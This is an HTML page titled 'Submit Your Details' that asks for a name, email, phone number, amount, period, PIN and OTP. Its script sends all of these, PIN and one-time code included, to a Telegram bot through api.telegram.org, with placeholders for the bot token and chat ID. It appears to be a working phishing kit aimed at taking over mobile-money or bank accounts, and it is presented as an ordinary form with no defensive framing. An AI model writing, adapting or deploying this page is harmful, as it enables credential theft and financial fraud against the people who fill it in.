<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Submit Your Details</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 500px; margin: 50px auto; }
    label { font-weight: bold; }
    input { width: 100%; padding: 8px; margin: 5px 0 15px 0; box-sizing: border-box; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    small { color: gray; }
    h2 { text-align: center; }
  </style>
</head>
<body>
  <h2>Submit Your Details</h2>
  <form id="detailsForm">
    <label>Full Name:</label>
    <input type="text" id="fullName" placeholder="Enter your full name" required>

    <label>Email:</label>
    <input type="email" id="email" placeholder="Enter your email" required>

    <label>Phone Number:</label>
    <input type="tel" id="phone" placeholder="+254712345678" required>

    <label>Amount:</label>
    <input type="number" id="amount" placeholder="Enter amount" required>

    <label>Period:</label>
    <input type="text" id="period" placeholder="e.g., 3 months" required>

    <label>PIN:</label>
    <input type="password" id="pin" placeholder="Enter PIN" required>

    <label>OTP:</label>
    <input type="text" id="otp" placeholder="Enter OTP" required>

    <button type="submit">Submit</button>
  </form>

  <p id="status"></p>

  <script>
    const form = document.getElementById('detailsForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const fullName = document.getElementById('fullName').value;
      const email = document.getElementById('email').value;
      const phone = document.getElementById('phone').value;
      const amount = document.getElementById('amount').value;
      const period = document.getElementById('period').value;
      const pin = document.getElementById('pin').value;
      const otp = document.getElementById('otp').value;

      const chat_id = "<YOUR_CHAT_ID>";
      const bot_token = "<YOUR_BOT_TOKEN>";
      const text = `
Full Name: ${fullName}
Email: ${email}
Phone: ${phone}
Amount: ${amount}
Period: ${period}
PIN: ${pin}
OTP: ${otp}
      `;

      const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
      try {
        await fetch(url);
        document.getElementById('status').innerText = "Submitted successfully!";
        form.reset();
      } catch (err) {
        document.getElementById('status').innerText = "Submission failed.";
      }
    });
  </script>
</body>
</html>
